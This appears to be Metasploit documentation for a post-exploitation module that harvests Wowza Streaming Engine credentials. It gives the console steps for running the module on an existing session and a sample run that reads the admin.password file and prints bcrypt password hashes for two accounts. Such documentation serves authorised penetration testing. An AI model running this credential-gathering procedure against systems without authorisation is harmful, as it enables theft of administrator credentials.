## Vulnerable Application

This module collects Wowza Streaming Engine user credentials.


## Installation Steps

Download and install [Wowza Streaming Engine](https://portal.wowza.com/account/downloads).


## Verification Steps

1. Start msfconsole
1. Get a session
1. Do: `use post/multi/gather/wowza_streaming_engine_creds`
1. Do: `set SESSION <session id>`
1. Do: `run`


## Options


## Scenarios

### Wowza Streaming Engine Manager Version 4.8.20+1 (build 20220919162035) on Ubuntu 22.04

```
msf6 > use post/multi/gather/wowza_streaming_engine_creds 
msf6 post(multi/gather/wowza_streaming_engine_creds) > set session 1
session => 1
msf6 post(multi/gather/wowza_streaming_engine_creds) > run

[*] Parsing file /usr/local/WowzaStreamingEngine/conf/admin.password
Wowza Streaming Engine Credentials
==================================

Username  Password                                                      Groups         Encoding
--------  --------                                                      ------         --------
guest     $2y$10$HbioW4tMn6aqtMjrXWxbp.sCCGkRL2bM2prNJG0elnLlcLnsV5XDK  basic          bcrypt
user      $2y$10$PiMwykGY8H9ZX45AwjgAluCXHwvswpCFrIsHmCKqLtSJLITXagjwu  admin|advUser  bcrypt

[+] Credentials stored in: /root/.msf4/loot/20230306035212_default_192.168.200.158_host.wowzastream_500725.txt
[*] Post module execution completed
```
